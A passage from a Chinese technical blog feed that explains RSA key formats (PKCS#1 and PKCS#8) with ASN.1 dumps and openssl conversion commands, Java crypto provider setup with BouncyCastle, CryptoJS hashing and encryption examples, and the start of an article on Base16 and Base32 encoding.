exponent2</span></span><br><span class="line">      <span class="number">02</span> <span class="number">01</span> <span class="number">26</span>      <span class="comment">// coefficient</span></span><br></pre></td></tr></table></figure>
<p>attributes为可选节，这里并没有</p>
<p>同时可以看到RSAPrivateKey部分就是PKCS#1格式中的数据，PKCS#8仅仅是多了些头部描述，因此PKCS#8可以通过不同的AlgorithmIdentifier值(RSA为<code>1.2.840.113549.1.1.1</code>)更加通用的表示其他算法</p>
<h5 id="公钥-2">公钥<a class="header-anchor" href="#公钥-2"> ¶ </a></h5>
<p>通过<code>openssl</code>生成PKCS#8格式的公钥</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">openssl rsa -<span class="keyword">in</span> private1.pem -pubout -out public8.pem</span><br></pre></td></tr></table></figure>
<p>得到</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-----BEGIN PUBLIC KEY-----</span><br><span class="line">MBswDQYJKoZIhvcNAQEBBQADCgAwBwICDKECARE=</span><br><span class="line">-----END PUBLIC KEY-----</span><br></pre></td></tr></table></figure>
<p>转换格式后</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">30</span> <span class="number">1b</span></span><br><span class="line">  <span class="number">30</span> <span class="number">0</span>d             <span class="comment">// AlgorithmIdentifier, len=14</span></span><br><span class="line">    <span class="number">06</span> <span class="number">09</span> <span class="number">2</span>a <span class="number">86</span> <span class="number">48</span> <span class="number">86</span> f7 <span class="number">0</span>d <span class="number">01</span> <span class="number">01</span> <span class="number">01</span>  <span class="comment">// RSA该值固定为1.2.840.113549.1.1.1</span></span><br><span class="line">    <span class="number">05</span> <span class="number">00</span>           <span class="comment">// NULL(可选参数)</span></span><br><span class="line">  <span class="number">03</span> <span class="number">0</span>a             <span class="comment">// PublicKey</span></span><br><span class="line">    <span class="number">00</span>              <span class="comment">// 不知</span></span><br><span class="line">    <span class="number">30</span> <span class="number">07</span>           <span class="comment">// PublicKey,len=7</span></span><br><span class="line">      <span class="number">02</span> <span class="number">02</span> <span class="number">0</span>c a1   <span class="comment">// modulus</span></span><br><span class="line">      <span class="number">02</span> <span class="number">01</span> <span class="number">11</span>      <span class="comment">// publicExponent</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>格式：摘自<a href="https://www.codeproject.com/Articles/25487/Cryptographic-Interoperability-Keys">Cryptographic Interoperability: Keys - CodeProject</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt;PublicKeyInfo ::= SEQUENCE &#123;</span><br><span class="line">&gt;algorithm AlgorithmIdentifier,</span><br><span class="line">&gt;PublicKey BIT STRING &#125;</span><br><span class="line"></span><br><span class="line">&gt;AlgorithmIdentifier ::= SEQUENCE &#123;</span><br><span class="line">&gt;algorithm ALGORITHM.id,</span><br><span class="line">&gt;parameters ALGORITHM.type OPTIONAL &#125;</span><br></pre></td></tr></table></figure>
</blockquote>
<h4 id="openssl-相关命令">openssl 相关命令<a class="header-anchor" href="#openssl-相关命令"> ¶ </a></h4>
<p><strong>rsa命令中</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">λ openssl rsa -<span class="built_in">help</span></span><br><span class="line">Usage: rsa [options]</span><br><span class="line">Valid options are:</span><br><span class="line"> -<span class="built_in">help</span>              Display this summary</span><br><span class="line"> -inform format     Input format, one of DER PEM</span><br><span class="line"> -outform format    Output format, one of DER PEM PVK</span><br><span class="line"> -<span class="keyword">in</span> val            Input file</span><br><span class="line"> -out outfile       Output file</span><br><span class="line"> -pubin             Expect a public key <span class="keyword">in</span> input file</span><br><span class="line"> -pubout            Output a public key</span><br><span class="line"> -passout val       Output file pass phrase <span class="built_in">source</span></span><br><span class="line"> -passin val        Input file pass phrase <span class="built_in">source</span></span><br><span class="line"> -RSAPublicKey_in   Input is an RSAPublicKey</span><br><span class="line"> -RSAPublicKey_out  Output is an RSAPublicKey</span><br><span class="line"> -noout             Don<span class="string">&#x27;t print key out</span></span><br><span class="line"><span class="string"> -text              Print the key in text</span></span><br><span class="line"><span class="string"> -modulus           Print the RSA key modulus</span></span><br><span class="line"><span class="string"> -check             Verify key consistency</span></span><br><span class="line"><span class="string"> -*                 Any supported cipher</span></span><br><span class="line"><span class="string"> -pvk-strong        Enable &#x27;</span>Strong<span class="string">&#x27; PVK encoding level (default)</span></span><br><span class="line"><span class="string"> -pvk-weak          Enable &#x27;</span>Weak<span class="string">&#x27; PVK encoding level</span></span><br><span class="line"><span class="string"> -pvk-none          Don&#x27;</span>t enforce PVK encoding</span><br><span class="line"> -engine val        Use engine, possibly a hardware device</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">openssl rsa -<span class="keyword">in</span> private1.pem -out public1.pem -RSAPublicKey_out     <span class="comment"># 从PKCS#1格式私钥 导出 PKCS#1格式公钥</span></span><br><span class="line">openssl rsa -<span class="keyword">in</span> private1.pem -pubout -out public8.pem               <span class="comment"># 从PKCS#1格式私钥 导出 PKCS#8格式公钥</span></span><br><span class="line"></span><br><span class="line">openssl rsa -<span class="keyword">in</span> private8.pem -out private1.pem						<span class="comment"># 将PKCS#8格式私钥 转换为 PKCS#1格式私钥</span></span><br><span class="line">openssl pkcs8 -topk8 -inform PEM -<span class="keyword">in</span> private1.pem -outform pem -nocrypt -out private8.pem       <span class="comment"># 将PKCS#1格式私钥 转换为 PKCS#8格式私钥</span></span><br><span class="line"></span><br><span class="line">openssl rsa -RSAPublicKey_in -<span class="keyword">in</span> public1.pem -pubout -out public8.pem	<span class="comment"># 将PKCS#1格式公钥 转换为 PKCS#8格式公钥</span></span><br><span class="line">openssl rsa -pubin -<span class="keyword">in</span> public8.pem -RSAPublicKey_out -out public1.pem	<span class="comment"># 将PKCS#8格式公钥 转换为 PKCS#1格式公钥</span></span><br></pre></td></tr></table></figure>
<p>可以看出</p>
<ul>
<li><code>-RSAPublicKey_in</code> 是输入PKCS#1的公钥</li>
<li><code>-RSAPublicKey_out</code> 是输出PKCS#1的公钥</li>
<li><code>-pubin</code> 是输入PKCS#8的公钥</li>
<li><code>-pubout</code> 是输出PKCS#8的公钥</li>
</ul>
<h3 id="其他-2">其他<a class="header-anchor" href="#其他-2"> ¶ </a></h3>
<p>继续请参考</p>
<ul>
<li><a href="https://www.codeproject.com/Articles/25487/Cryptographic-Interoperability-Keys">Cryptographic Interoperability: Keys - CodeProject</a></li>
<li><a href="https://cloud.tencent.com/developer/article/1424668">X.509、PKCS文件格式介绍 - 云+社区 - 腾讯云 (tencent.com)</a></li>
<li><a href="https://zhuanlan.zhihu.com/p/345324498">深入剖析 RSA 密钥原理及实践 - 知乎 (zhihu.com)</a></li>
<li><a href="https://www.cnblogs.com/littleatp/p/7384706.html">公钥证书编码解读 - 美码师 - 博客园 (cnblogs.com)</a></li>
<li><a href="https://qastack.cn/server/9708/what-is-a-pem-file-and-how-does-it-differ-from-other-openssl-generated-key-file">什么是Pem文件，它与其他OpenSSL生成的密钥文件格式有何区别？ (qastack.cn)</a></li>
<li><a href="https://blog.freessl.cn/ssl-cert-format-introduce/">SSL 证书格式普及，PEM、CER、JKS、PKCS12 (freessl.cn)</a></li>
</ul>
<h1 id="JAVA实现加解密">JAVA实现加解密<a class="header-anchor" href="#JAVA实现加解密"> ¶ </a></h1>
<h2 id="Java加解密环境配置">Java加解密环境配置<a class="header-anchor" href="#Java加解密环境配置"> ¶ </a></h2>
<p><a href="https://www.docin.com/p-1475296172.html"><strong>SunJCE Provider 支持的Cipher详细信息(部分)</strong> — 关于加密数据的填充方式的研究 - 豆丁网 (docin.com)</a></p>
<table>
<thead>
<tr>
<th>algorithm(算法)</th>
<th>mode(工作模式)</th>
<th>padding(填充模式)</th>
</tr>
</thead>
<tbody>
<tr>
<td>AES</td>
<td>ECB、CBC、PCBC、CTR、CTS、CFB、CFBB-CFB128等</td>
<td>NoPadding、PKCS5Padding、ISO10126Padding</td>
</tr>
<tr>
<td>AESWrap</td>
<td>ECB</td>
<td>NoPadding</td>
</tr>
<tr>
<td>ARCFOUR</td>
<td>ECB</td>
<td>NoPadding</td>
</tr>
<tr>
<td>Blowfish、DES、DESede、RC2</td>
<td>ECB、CBC、PCBC、CTR、CTS、CFB、CFBB-CFB128等</td>
<td>NoPadding、PKCS5Padding、ISO10126Padding</td>
</tr>
<tr>
<td>DESedeWrap</td>
<td>CBC</td>
<td>NoPadding</td>
</tr>
<tr>
<td>PBEWithMD5AndDES、PBEWithMD5AndTripleDES、PBEWithSHA1AndDESede、BEWithSHA1AndRC2_40</td>
<td>CBC</td>
<td>PKCS5Padding</td>
</tr>
<tr>
<td>RSA</td>
<td>ECB、NONE</td>
<td>NoPadding、PKCS1Padding等</td>
</tr>
</tbody>
</table>
<table>
<thead>
<tr>
<th style="text-align:center">SunJCE 支持</th>
<th style="text-align:center">需添加 BouncyCastle 支持</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">NoPadding</td>
<td style="text-align:center"></td>
</tr>
<tr>
<td style="text-align:center">PKCS5Padding</td>
<td style="text-align:center">PKCS7Padding</td>
</tr>
<tr>
<td style="text-align:center">ANSI X923Padding</td>
<td style="text-align:center"></td>
</tr>
<tr>
<td style="text-align:center">ISO10126Padding</td>
<td style="text-align:center"></td>
</tr>
<tr>
<td style="text-align:center">ISO7816-4Padding</td>
<td style="text-align:center"></td>
</tr>
<tr>
<td style="text-align:center">ZeroBytePadding</td>
<td style="text-align:center"></td>
</tr>
<tr>
<td style="text-align:center">TBCPadding</td>
<td style="text-align:center"></td>
</tr>
<tr>
<td style="text-align:center"></td>
<td style="text-align:center">PKCS1Padding</td>
</tr>
</tbody>
</table>
<h3 id="1-解除java-jdk政策限制">1. 解除java jdk政策限制<a class="header-anchor" href="#1-解除java-jdk政策限制"> ¶ </a></h3>
<ul>
<li>
<p>对于Java 8 Update 144和更早版本，需要安装Java密码学扩展（JCE）无限强度管辖权策略文件。</p>
<ul>
<li>
<p>相关解除政策限制文件下载 <a href="http://www.oracle.com/technetwork/java/javase/downloads/jce-6-download-429243.html">jdk6</a> | <a href="http://www.oracle.com/technetwork/java/javase/downloads/jce-7-download-432124.html">jdk7</a> | <a href="http://www.oracle.com/technetwork/java/javase/downloads/jce8-download-2133166.html">jdk8</a></p>
</li>
<li>
<p>解压缩后将下载文件中的两个jar替换在<code>%JAVA_HOME%\jre\lib\security</code>下的jar</p>
</li>
<li>
<blockquote>
<p>注意：如果您以后决定恢复到原始的受限策略版本，请首先在中备份原始JCE策略文件（US_export_policy.jar和local_policy.jar）<code>$JAVA_HOME/jre/lib/security</code>。</p>
</blockquote>
</li>
</ul>
</li>
<li>
<p>Java 8 Update 151及更高版本</p>
<ul>
<li>
<p>包括了“无限强度管辖策略”，但默认情况下不使用。要启用它，您需要<code>java.security</code>在<code>$JAVA_HOME/jre/lib/security</code>（对于JDK）或<code>$JAVA_HOME/lib/security</code>（对于JRE）中编辑<code>java.security</code>文件。取消注释（或包括）该行：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">crypto.policy=unlimited</span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
<li>
<p>jdk11</p>
<blockquote>
<p>The default JCE policy files bundled in this Java Runtime Environment allow for “unlimited” cryptographic strengths.</p>
<p>For convenience, this software also contains the historic “limited” strength policy files which restricts cryptographic strengths. To use the limited strength policy, instead of the default unlimited policy, you must update the “crypto.policy” Security property (in <code>/conf/security/java.security</code>) to point to the appropriate directory.</p>
<p>You are advised to consult your export/import control counsel or attorney to determine the exact requirements of your location, and what policy settings should be used.</p>
</blockquote>
<p>大致意思就是<strong>JDK11默认是无限制</strong>，可以在<code>$JAVA_HOME/conf/security/java.security</code>文件中配置<code>crypto.policy</code>属性为<code>unlimited</code>或者<code>limited</code></p>
</li>
</ul>
<p>真tm乱</p>
<h4 id="检测是否已经解除限制">检测是否已经解除限制<a class="header-anchor" href="#检测是否已经解除限制"> ¶ </a></h4>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        KeyGenerator kg =  KeyGenerator.getInstance(<span class="string">&quot;AES&quot;</span>);</span><br><span class="line">        kg.init(<span class="number">256</span>);</span><br><span class="line">        SecretKey secretKey=kg.generateKey();</span><br><span class="line">        System.out.println(secretKey.getFormat());</span><br><span class="line">    &#125; <span class="keyword">catch</span> (NoSuchAlgorithmException e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>运行成功则已经解除限制</p>
<h3 id="2-配置BouncyCastle">2.配置BouncyCastle<a class="header-anchor" href="#2-配置BouncyCastle"> ¶ </a></h3>
<p>下载BC：<a href="https://www.bouncycastle.org/latest_releases.html">BouncyCastle下载地址</a></p>
<h4 id="（方法一）全局静态配置">（方法一）全局静态配置<a class="header-anchor" href="#（方法一）全局静态配置"> ¶ </a></h4>
<p>把<code>bcprov-ext*.jar</code>文件复制到 <code>%JAVA_HOME%\jre\lib\ext</code> 目录下面<br>
修改配置文件<code>\jre\lib\security\java.security</code></p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">security.provider.<span class="number">1</span>=sun.security.provider.Sun</span><br><span class="line">security.provider.<span class="number">2</span>=sun.security.rsa.SunRsaSign</span><br><span class="line">security.provider.<span class="number">3</span>=sun.security.ec.SunEC</span><br><span class="line">security.provider.<span class="number">4</span>=com.sun.<span class="built_in">net</span>.ssl.internal.ssl.Provider</span><br><span class="line">security.provider.<span class="number">5</span>=com.sun.crypto.provider.SunJCE</span><br><span class="line">security.provider.<span class="number">6</span>=sun.security.jgss.SunProvider</span><br><span class="line">security.provider.<span class="number">7</span>=com.sun.security.sasl.Provider</span><br><span class="line">security.provider.<span class="number">8</span>=org.jcp.xml.dsig.internal.dom.XMLDSigRI</span><br><span class="line">security.provider.<span class="number">9</span>=sun.security.smartcardio.SunPCSC</span><br><span class="line">security.provider.<span class="number">10</span>=sun.security.mscapi.SunMSCAPI</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">security.provider.<span class="number">11</span>=org.bouncycastle.jce.provider.BouncyCastleProvider</span><br></pre></td></tr></table></figure>
<p>这样添加后便可以启用了，如果IDEA找不到类(无提示)，去【Project Structure】-&gt;【Platform Settings】-&gt; 【SDKs】添加相应的jar包路径，或者直接删掉jdk再重新添加。</p>
<h4 id="（方法二）动态添加jar">（方法二）动态添加jar<a class="header-anchor" href="#（方法二）动态添加jar"> ¶ </a></h4>
<p>导入不含ext的另一个jar</p>
<p>所使用的类中添加</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> &#123;</span><br><span class="line">    Security.addProvider(<span class="keyword">new</span> BouncyCastleProvider());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="验证使用">验证使用<a class="header-anchor" href="#验证使用"> ¶ </a></h4>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">    Provider provider = Security.getProvider(<span class="string">&quot;BC&quot;</span>);</span><br><span class="line">    System.out.println(provider);</span><br><span class="line">    <span class="keyword">for</span>(Map.Entry&lt;Object,Object&gt; entry:provider.entrySet())&#123;</span><br><span class="line">        System.out.println(entry.getKey()+<span class="string">&quot; --&gt; &quot;</span>+entry.getValue());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>运行类似下，则配置成功</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">BC version 1.69</span><br><span class="line">Cipher.ARIARFC3211WRAP --&gt; org.bouncycastle.jcajce.provider.symmetric.ARIA<span class="variable">$RFC3211Wrap</span></span><br><span class="line">Alg.Alias.Cipher.1.3.6.1.4.1.22554.1.1.2.1.22 --&gt; PBEWITHSHAAND192BITAES-CBC-BC</span><br><span class="line">Alg.Alias.AlgorithmParameters.SHA512withRSA/PSS --&gt; PSS</span><br><span class="line">Alg.Alias.Mac.HMAC/Skein-256-224 --&gt; HMACSkein-256-224</span><br><span class="line">Alg.Alias.MessageDigest.SHA256 --&gt; SHA-256</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="配置CommonsCodec">配置CommonsCodec<a class="header-anchor" href="#配置CommonsCodec"> ¶ </a></h3>
<p><a href="https://commons.apache.org/proper/commons-codec/download_codec.cgi">Commons Codec下载地址</a></p>
<h1 id="JavaScript实现加解密">JavaScript实现加解密<a class="header-anchor" href="#JavaScript实现加解密"> ¶ </a></h1>
<h2 id="CryptoJS库使用">CryptoJS库使用<a class="header-anchor" href="#CryptoJS库使用"> ¶ </a></h2>
<p>下载地址：</p>
<ul>
<li>GitHub地址：<a href="https://github.com/brix/crypto-js">https://github.com/brix/crypto-js</a></li>
<li>npm下载：<code>npm install crypto-js</code></li>
</ul>
<p>使用其中的<code>crypto-js.js</code>文件</p>
<p><strong>更多使用示例参照<a href="https://cryptojs.gitbook.io/docs">CryptoJS - CryptoJS (gitbook.io)</a></strong></p>
<h3 id="解析数据">解析数据<a class="header-anchor" href="#解析数据"> ¶ </a></h3>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 转为字节数组</span></span><br><span class="line"><span class="keyword">var</span> wordArray = CryptoJS.enc.Utf8.parse(utf8String);</span><br><span class="line"><span class="keyword">var</span> wordArray = CryptoJS.enc.Hex.parse(hexString);</span><br><span class="line"><span class="keyword">var</span> wordArray = CryptoJS.enc.Base64.parse(base64String);</span><br><span class="line"><span class="keyword">var</span> wordArray = CryptoJS.enc.Latin1.parse(latin1String);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 字节数组转</span></span><br><span class="line"><span class="keyword">var</span> utf8String = CryptoJS.enc.Utf8.stringify(wordArray);</span><br><span class="line"><span class="keyword">var</span> hexString = CryptoJS.enc.Hex.stringify(wordArray);</span><br><span class="line"><span class="keyword">var</span> base64String = CryptoJS.enc.Base64.stringify(wordArray);</span><br><span class="line"><span class="keyword">var</span> latin1String = CryptoJS.enc.Latin1.stringify(wordArray);</span><br><span class="line"></span><br><span class="line">CryptoJS.format.OpenSSL.parse(sslString);</span><br><span class="line">CryptoJS.format.OpenSSL.stringify(wordArray);</span><br></pre></td></tr></table></figure>
<h3 id="MD">MD<a class="header-anchor" href="#MD"> ¶ </a></h3>
<h4 id="MD5-2">MD5<a class="header-anchor" href="#MD5-2"> ¶ </a></h4>
<h5 id="简单调用">简单调用<a class="header-anchor" href="#简单调用"> ¶ </a></h5>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> hash = CryptoJS.MD5(message);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> hash = CryptoJS.MD5(wordArray);</span><br><span class="line"><span class="comment">// MAC</span></span><br><span class="line"><span class="keyword">var</span> hmac = CryptoJS.HmacMD5(message, key);</span><br></pre></td></tr></table></figure>
<h5 id="复杂调用">复杂调用<a class="header-anchor" href="#复杂调用"> ¶ </a></h5>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">md5Example</span>(<span class="params">data</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> hasher = CryptoJS.algo.MD5.create();</span><br><span class="line">    hasher.reset(); <span class="comment">// 清掉之前设置的明文数据</span></span><br><span class="line">    hasher.update(data);    <span class="comment">// 添加明文数据</span></span><br><span class="line">    <span class="keyword">var</span> hash = hasher.finalize();   <span class="comment">// 进行加密</span></span><br><span class="line">    <span class="keyword">return</span> hash;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>HmacMD5</strong></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hmacmd5Example</span>(<span class="params">data, key</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> hmacHasher = CryptoJS.algo.HMAC.create(CryptoJS.algo.MD5, key);</span><br><span class="line">    hmacHasher.reset(); <span class="comment">// 清掉之前设置的明文数据</span></span><br><span class="line">    hmacHasher.update(data); <span class="comment">// 添加明文数据</span></span><br><span class="line">    <span class="keyword">var</span> hmac = hmacHasher.finalize(); <span class="comment">// 进行加密</span></span><br><span class="line">    <span class="keyword">return</span> hmac;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="SHA">SHA<a class="header-anchor" href="#SHA"> ¶ </a></h3>
<h4 id="SHA1-2">SHA1<a class="header-anchor" href="#SHA1-2"> ¶ </a></h4>
<h5 id="简单调用-2">简单调用<a class="header-anchor" href="#简单调用-2"> ¶ </a></h5>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> hash = CryptoJS.SHA1(message);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> hash = CryptoJS.SHA1(wordArray);</span><br><span class="line"></span><br><span class="line"><span class="comment">// MAC</span></span><br><span class="line"><span class="keyword">var</span> hmac = CryptoJS.HmacSHA1(message, key);</span><br></pre></td></tr></table></figure>
<h4 id="SHA224">SHA224<a class="header-anchor" href="#SHA224"> ¶ </a></h4>
<h5 id="简单调用-3">简单调用<a class="header-anchor" href="#简单调用-3"> ¶ </a></h5>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> hash = CryptoJS.SHA224(message);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> hash = CryptoJS.SHA224(wordArray);</span><br><span class="line"></span><br><span class="line"><span class="comment">// MAC</span></span><br><span class="line"><span class="keyword">var</span> hmac = CryptoJS.HmacSHA224(message, key);</span><br></pre></td></tr></table></figure>
<h4 id="SHA256">SHA256<a class="header-anchor" href="#SHA256"> ¶ </a></h4>
<h5 id="简单调用-4">简单调用<a class="header-anchor" href="#简单调用-4"> ¶ </a></h5>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> hash = CryptoJS.SHA256(message);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> hash = CryptoJS.SHA256(wordArray);</span><br><span class="line"></span><br><span class="line"><span class="comment">// MAC</span></span><br><span class="line"><span class="keyword">var</span> hmac = CryptoJS.HmacSHA256(message, key);</span><br></pre></td></tr></table></figure>
<h4 id="复杂调用-2">复杂调用<a class="header-anchor" href="#复杂调用-2"> ¶ </a></h4>
<p>同md5，将<code>MD5</code>类替换为<code>SHA256</code>即可</p>
<h4 id="SHA3">SHA3<a class="header-anchor" href="#SHA3"> ¶ </a></h4>
<p>格式同上</p>
<h4 id="SHA384">SHA384<a class="header-anchor" href="#SHA384"> ¶ </a></h4>
<p>格式同上</p>
<h4 id="SHA512">SHA512<a class="header-anchor" href="#SHA512"> ¶ </a></h4>
<p>格式同上</p>
<h3 id="DES-2">DES<a class="header-anchor" href="#DES-2"> ¶ </a></h3>
<p>示例</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">desenExample</span>(<span class="params">data, key</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> data = CryptoJS.enc.Utf8.parse(data);</span><br><span class="line">    <span class="keyword">var</span> key = CryptoJS.enc.Utf8.parse(key);</span><br><span class="line">    <span class="keyword">var</span> cfg = &#123;</span><br><span class="line">        <span class="attr">mode</span>: CryptoJS.mode.ECB, <span class="comment">// 加密模式</span></span><br><span class="line">        <span class="attr">padding</span>: CryptoJS.pad.Pkcs7 <span class="comment">// 填充方式</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">var</span> result = CryptoJS.DES.encrypt(data, <span class="comment">// 待加密数据</span></span><br><span class="line">        key, <span class="comment">// 加密密钥</span></span><br><span class="line">        cfg);</span><br><span class="line">    <span class="keyword">var</span> restr = result.toString();</span><br><span class="line">    <span class="keyword">return</span> restr;</span><br><span class="line">&#125;</span><br><span class="line">desenExample(<span class="string">&quot;desExample&quot;</span>,<span class="string">&quot;12345678&quot;</span>);</span><br></pre></td></tr></table></figure>
<p>DESede/TripleDES<br>
将上述类名DES换为TripleDES即可</p>
<h3 id="AES-2">AES<a class="header-anchor" href="#AES-2"> ¶ </a></h3>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">aesExample</span>(<span class="params">data, key, iv</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> key = CryptoJS.enc.Utf8.parse(key);</span><br><span class="line">    <span class="keyword">var</span> iv = CryptoJS.enc.Utf8.parse(iv);</span><br><span class="line">    <span class="keyword">var</span> cfg = &#123;</span><br><span class="line">        <span class="attr">iv</span>: iv, <span class="comment">// iv</span></span><br><span class="line">        <span class="attr">mode</span>: CryptoJS.mode.CBC, <span class="comment">// 加密模式</span></span><br><span class="line">        <span class="attr">padding</span>: CryptoJS.pad.Pkcs7</span><br><span class="line">    &#125; <span class="comment">// 填充方式</span></span><br><span class="line">    <span class="comment">// format: CryptoJS.format.Hex // 以十六进制输出(默认采用Base64方式)</span></span><br><span class="line">    <span class="keyword">var</span> result = CryptoJS.AES.encrypt(data, <span class="comment">// 待加密数据</span></span><br><span class="line">        key, <span class="comment">// 加密密钥</span></span><br><span class="line">        cfg);</span><br><span class="line">    <span class="keyword">var</span> restr = result.toString();</span><br><span class="line">    <span class="keyword">return</span> restr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="jsencrypt">jsencrypt<a class="header-anchor" href="#jsencrypt"> ¶ </a></h2>
<p><a href="https://github.com/travist/jsencrypt">travist/jsencrypt: A Javascript library to perform OpenSSL RSA Encryption, Decryption, and Key Generation. (github.com)</a></p>
<h2 id="jsrsasign">jsrsasign<a class="header-anchor" href="#jsrsasign"> ¶ </a></h2>
<p><a href="https://github.com/kjur/jsrsasign">kjur/jsrsasign: The ‘jsrsasign’ (RSA-Sign JavaScript Library) is an opensource free cryptography library supporting RSA/RSAPSS/ECDSA/DSA signing/validation, ASN.1, PKCS#1/5/8 private/public key, X.509 certificate, CRL, OCSP, CMS SignedData, TimeStamp, CAdES JSON Web Signature/Token in pure JavaScript. (github.com)</a></p>
<h2 id="RSA-js">RSA.js<a class="header-anchor" href="#RSA-js"> ¶ </a></h2>
<p><a href="https://ohdave.com/rsa/">RSA In JavaScript - ohdave.com</a></p>
<hr class="footnotes-sep">
<section class="footnotes">
<ol class="footnotes-list">
<li id="fn1" class="footnote-item"><p>在电信和计算机网络领域，ASN.1（Abstract Syntax Notation One) 是一套标准，是描述数据的表示、编码、传输、解码的灵活的记法。它提供了一套正式、无歧义和精确的规则以描述独立于特定计算机硬件的对象结构。<strong>ASN.1是一种语言，一种标记语言，作用是描述数据结构。基于这种数据结构可以进行数据的表示、编码、传输和解码。</strong> <a href="#fnref1" class="footnote-backref">↩︎</a></p>
</li>
</ol>
</section>
]]></content>
      <categories>
        <category>Android逆向</category>
      </categories>
      <tags>
        <tag>Android逆向</tag>
      </tags>
  </entry>
  <entry>
    <title>Base16,Base32,Base64编码详细学习</title>
    <url>/Reverse/2020/Base64_coding_learning/</url>
    <content><![CDATA[<h1 id="Base编码">Base编码<a class="header-anchor" href="#Base编码"> ¶ </a></h1>
<h2 id="Base16编码">Base16编码<a class="header-anchor" href="#Base16编码"> ¶ </a></h2>
<h3 id="Base16编码表格">Base16编码表格<a class="header-anchor" href="#Base16编码表格"> ¶ </a></h3>
<p>Base16字符表：<code>0123456789ABCDEF</code></p>
<table>
<thead>
<tr>
<th>下标</th>
<th>编码值</th>
<th>下标</th>
<th>编码值</th>
</tr>
</thead>
<tbody>
<tr>
<td>0</td>
<td>0</td>
<td>8</td>
<td>8</td>
</tr>
<tr>
<td>1</td>
<td>1</td>
<td>9</td>
<td>9</td>
</tr>
<tr>
<td>2</td>
<td>2</td>
<td>10</td>
<td>A</td>
</tr>
<tr>
<td>3</td>
<td>3</td>
<td>11</td>
<td>B</td>
</tr>
<tr>
<td>4</td>
<td>4</td>
<td>12</td>
<td>C</td>
</tr>
<tr>
<td>5</td>
<td>5</td>
<td>13</td>
<td>D</td>
</tr>
<tr>
<td>6</td>
<td>6</td>
<td>14</td>
<td>E</td>
</tr>
<tr>
<td>7</td>
<td>7</td>
<td>15</td>
<td>F</td>
</tr>
</tbody>
</table>
<h3 id="Base16编码方式">Base16编码方式<a class="header-anchor" href="#Base16编码方式"> ¶ </a></h3>
<ol>
<li>将数据(根据ASCII编码,UTF-8编码等)转成对应的二进制数</li>
<li>然后将所有的二进制全部串起来，4个二进制位为一组，转化成对应十进制数。</li>
<li>根据十进制数值找到Base16编码表里面对应的字符</li>
</ol>
<p>base16是4个比特位表示一个字符，原码是1个字节（8个比特位）表示一个字符，也就是说原先如果使用ASCII编码后的一个字符，现在转化成两个字符。数据量是原先的2倍。<br>
<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img-blog.csdnimg.cn/20191218201844154.png" alt="在这里插入图片描述"><br>
也就是<code>LOVE</code>加密后是<code>4C4F5645</code></p>
<h3 id="Base16伪代码-实际环境">Base16伪代码|实际环境<a class="header-anchor" href="#Base16伪代码-实际环境"> ¶ </a></h3>
<p>@TODO</p>
<h2 id="Base32编码">Base32编码<a class="header-anchor" href="#Base32编码"> ¶ </a></h2>
<h3 id="Base32编码表格">Base32编码表格<a class="header-anchor" href="#Base32编码表格"> ¶ </a></h3>
